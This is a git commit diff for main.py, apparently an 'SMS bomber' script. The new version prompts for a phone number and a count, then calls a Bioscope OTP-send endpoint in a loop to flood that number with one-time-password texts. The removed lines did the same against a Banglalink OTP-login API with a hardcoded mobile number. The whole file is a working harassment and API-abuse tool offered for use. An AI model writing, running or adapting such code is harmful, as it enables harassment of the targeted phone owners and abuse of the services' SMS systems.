3f7737722fbeb1b2652d1b1f10794872b0f552b5
Dsx7 <79498453+Dsx7@users.noreply.github.com>
2021-02-25 16:03:13 +0600

    Update main.py

--- main.py
+++ main.py
@@ -1,14 +1,16 @@
+import sys, time, os
+message = ("Thsi Programme is made by \n Official Coder: Dsx")
+for char in message:
+	sys.stdout.write(char)
+	sys.stdout.flush()
+	time.sleep(0.1)
+
+print("\nSuccessfully Loaded")
+
 import requests
-
-#POST
-
-myblapi="https://assetliteapi.banglalink.net/api/v1/user/otp-login/request"
-
-number={'mobile':'01963529363'}
-
-amount=int(input(" Enter The Amount : "))
-
+number = str(input("[>]Enter The GP Phone Number: "))
+amount = int(input("[>]Enter Amount: "))
+api = "https://stage.bioscopelive.com/en/login/send-otp?phone=88" + number + "&operator=bd-otp"
 for i in range(amount):
-requests.post(myblapi,data=number)
-print(str(i+1)+" SMS Sent ")
-
+	requests.get(api)
+print(str(i + 1) + "SMS Sent")
